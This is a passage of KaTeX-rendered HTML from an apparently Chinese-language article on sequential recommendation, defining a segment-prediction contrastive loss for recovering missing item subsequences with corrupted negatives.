mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3280857142857143em;\"><span style=\"top:-2.3569999999999998em;margin-left:0em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3448em;\"><span style=\"top:-2.3447999999999998em;margin-left:-0.05724em;margin-right:0.1em;\"><span class=\"pstrut\" style=\"height:2.64444em;\"></span><span class=\"mord mtight\">1</span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.29964em;\"><span></span></span></span></span></span></span><span class=\"mrel mtight\">:</span><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3448em;\"><span style=\"top:-2.3447999999999998em;margin-left:-0.05724em;margin-right:0.1em;\"><span class=\"pstrut\" style=\"height:2.64444em;\"></span><span class=\"mord mtight\">2</span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.29964em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3570285714285715em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.39992em;\"><span></span></span></span></span></span></span></span></span></span> 表示整个序列中<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>i</mi><mrow><msub><mi>j</mi><mn>1</mn></msub><mo>:</mo><msub><mi>j</mi><mn>2</mn></msub></mrow></msub></mrow><annotation encoding=\"application/x-tex\">{i_{j_1:j_2}}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.9456279999999999em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31731428571428577em;\"><span style=\"top:-2.357em;margin-left:-0.05724em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span><span class=\"mrel mtight\">:</span><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31731428571428577em;\"><span style=\"top:-2.357em;margin-left:-0.05724em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span></span></span></span></span> 的上下文</p>\n</li>\n<li>\n<p>我们可以利用 MIN 公式里的段预测损失（SP）来回复缺失的项目段:</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mtable rowspacing=\"0.24999999999999992em\" columnalign=\"right left\" columnspacing=\"0em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><msub><mi>L</mi><mrow><mi>S</mi><mi>P</mi></mrow></msub><mo stretchy=\"false\">(</mo><msub><mi>C</mi><msub><mi>i</mi><mrow><msub><mi>j</mi><mn>1</mn></msub><mo>:</mo><msub><mi>j</mi><mn>2</mn></msub></mrow></msub></msub><mo separator=\"true\">,</mo><msub><mi>i</mi><mrow><msub><mi>j</mi><mn>1</mn></msub><mo>:</mo><msub><mi>j</mi><mn>2</mn></msub></mrow></msub><mo stretchy=\"false\">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mo>=</mo><mi>f</mi><mo stretchy=\"false\">(</mo><msub><mi>C</mi><msub><mi>i</mi><mrow><msub><mi>j</mi><mn>1</mn></msub><mo>:</mo><msub><mi>j</mi><mn>2</mn></msub></mrow></msub></msub><mo separator=\"true\">,</mo><msub><mi>i</mi><mrow><msub><mi>j</mi><mn>1</mn></msub><mo>:</mo><msub><mi>j</mi><mn>2</mn></msub></mrow></msub><mo stretchy=\"false\">)</mo><mo>−</mo><mi>log</mi><mo>⁡</mo><munder><mo>∑</mo><msub><mover accent=\"true\"><mi>i</mi><mo>~</mo></mover><mrow><msub><mi>j</mi><mn>1</mn></msub><mo>:</mo><msub><mi>j</mi><mn>2</mn></msub></mrow></msub></munder><mi>exp</mi><mo>⁡</mo><mrow><mo stretchy=\"false\">(</mo><mi>f</mi><mo stretchy=\"false\">(</mo><msub><mi>C</mi><msub><mi>i</mi><mrow><msub><mi>j</mi><mn>1</mn></msub><mo>:</mo><msub><mi>j</mi><mn>2</mn></msub></mrow></msub></msub><mo separator=\"true\">,</mo><msub><mover accent=\"true\"><mi>i</mi><mo>~</mo></mover><mrow><msub><mi>j</mi><mn>1</mn></msub><mo>:</mo><msub><mi>j</mi><mn>2</mn></msub></mrow></msub><mo stretchy=\"false\">)</mo><mo stretchy=\"false\">)</mo></mrow><mo separator=\"true\">,</mo></mrow></mstyle></mtd></mtr></mtable><annotation encoding=\"application/x-tex\">\\begin{aligned}&amp;L_{SP}(C_{i_{j_{1}:j_{2}}},i_{j_{1}:j_{2}})\\\\&amp;=f(C_{i_{j_{1}:j_{2}}},i_{j_{1}:j_{2}})-\\log\\sum_{\\tilde{i}_{j_{1}:j_{2}}}\\exp{(f(C_{i_{j_{1}:j_{2}}},\\tilde{i}_{j_{1}:j_{2}}))},\\end{aligned}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:4.583316em;vertical-align:-2.041658em;\"></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-r\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.541658em;\"><span style=\"top:-4.751663000000001em;\"><span class=\"pstrut\" style=\"height:3.050005em;\"></span><span class=\"mord\"></span></span><span style=\"top:-3.0017380000000005em;\"><span class=\"pstrut\" style=\"height:3.050005em;\"></span><span class=\"mord\"></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.041658em;\"><span></span></span></span></span></span><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.541658em;\"><span style=\"top:-4.751663000000001em;\"><span class=\"pstrut\" style=\"height:3.050005em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\"><span class=\"mord mathnormal\">L</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">P</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3280857142857143em;\"><span style=\"top:-2.3569999999999998em;margin-left:0em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3448em;\"><span style=\"top:-2.3447999999999998em;margin-left:-0.05724em;margin-right:0.1em;\"><span class=\"pstrut\" style=\"height:2.64444em;\"></span><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.29964em;\"><span></span></span></span></span></span></span><span class=\"mrel mtight\">:</span><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3448em;\"><span style=\"top:-2.3447999999999998em;margin-left:-0.05724em;margin-right:0.1em;\"><span class=\"pstrut\" style=\"height:2.64444em;\"></span><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.29964em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3570285714285715em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.39992em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31731428571428577em;\"><span style=\"top:-2.357em;margin-left:-0.05724em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span><span class=\"mrel mtight\">:</span><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31731428571428577em;\"><span style=\"top:-2.357em;margin-left:-0.05724em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span></span></span><span style=\"top:-3.0017380000000005em;\"><span class=\"pstrut\" style=\"height:3.050005em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3280857142857143em;\"><span style=\"top:-2.3569999999999998em;margin-left:0em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3448em;\"><span style=\"top:-2.3447999999999998em;margin-left:-0.05724em;margin-right:0.1em;\"><span class=\"pstrut\" style=\"height:2.64444em;\"></span><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.29964em;\"><span></span></span></span></span></span></span><span class=\"mrel mtight\">:</span><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3448em;\"><span style=\"top:-2.3447999999999998em;margin-left:-0.05724em;margin-right:0.1em;\"><span class=\"pstrut\" style=\"height:2.64444em;\"></span><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.29964em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3570285714285715em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.39992em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31731428571428577em;\"><span style=\"top:-2.357em;margin-left:-0.05724em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span><span class=\"mrel mtight\">:</span><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31731428571428577em;\"><span style=\"top:-2.357em;margin-left:-0.05724em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mop\">lo<span style=\"margin-right:0.01389em;\">g</span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mop op-limits\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.050005em;\"><span style=\"top:-1.7065289999999997em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord accent mtight\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.89638em;\"><span style=\"top:-2.7em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span><span style=\"top:-3.2785200000000003em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"accent-body\" style=\"left:-0.25em;\"><span class=\"mord mtight\">~</span></span></span></span></span></span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3280857142857143em;\"><span style=\"top:-2.3569999999999998em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3448em;\"><span style=\"top:-2.3447999999999998em;margin-left:-0.05724em;margin-right:0.1em;\"><span class=\"pstrut\" style=\"height:2.64444em;\"></span><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.29964em;\"><span></span></span></span></span></span></span><span class=\"mrel mtight\">:</span><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3448em;\"><span style=\"top:-2.3447999999999998em;margin-left:-0.05724em;margin-right:0.1em;\"><span class=\"pstrut\" style=\"height:2.64444em;\"></span><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.29964em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3570285714285715em;\"><span></span></span></span></span></span></span></span></span></span><span style=\"top:-3.0500049999999996em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span><span class=\"mop op-symbol large-op\">∑</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.693391em;\"><span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mop\">exp</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3280857142857143em;\"><span style=\"top:-2.3569999999999998em;margin-left:0em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3448em;\"><span style=\"top:-2.3447999999999998em;margin-left:-0.05724em;margin-right:0.1em;\"><span class=\"pstrut\" style=\"height:2.64444em;\"></span><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.29964em;\"><span></span></span></span></span></span></span><span class=\"mrel mtight\">:</span><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3448em;\"><span style=\"top:-2.3447999999999998em;margin-left:-0.05724em;margin-right:0.1em;\"><span class=\"pstrut\" style=\"height:2.64444em;\"></span><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.29964em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3570285714285715em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.39992em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord accent\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.89638em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">i</span></span></span><span style=\"top:-3.57852em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.25em;\"><span class=\"mord\">~</span></span></span></span></span></span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31731428571428577em;\"><span style=\"top:-2.357em;margin-left:-0.05724em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span><span class=\"mrel mtight\">:</span><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31731428571428577em;\"><span style=\"top:-2.357em;margin-left:-0.05724em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mclose\">)</span></span><span class=\"mpunct\">,</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.041658em;\"><span></span></span></span></span></span></span></span></span></span></span></span></p>\n<ul>\n<li>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mover accent=\"true\"><mi>i</mi><mo>~</mo></mover><mrow><msub><mi>j</mi><mn>1</mn></msub><mo>:</mo><msub><mi>j</mi><mn>2</mn></msub></mrow></msub></mrow><annotation encoding=\"application/x-tex\">\\tilde i_{j_1:j_2}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.182488em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord accent\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.89638em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord mathnormal\">i</span></span><span style=\"top:-3.57852em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.25em;\"><span class=\"mord\">~</span></span></span></span></span></span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31731428571428577em;\"><span style=\"top:-2.357em;margin-left:-0.05724em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span><span class=\"mrel mtight\">:</span><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31731428571428577em;\"><span style=\"top:-2.357em;margin-left:-0.05724em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span></span></span></span> 为损坏的负子序列，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>f</mi><mo 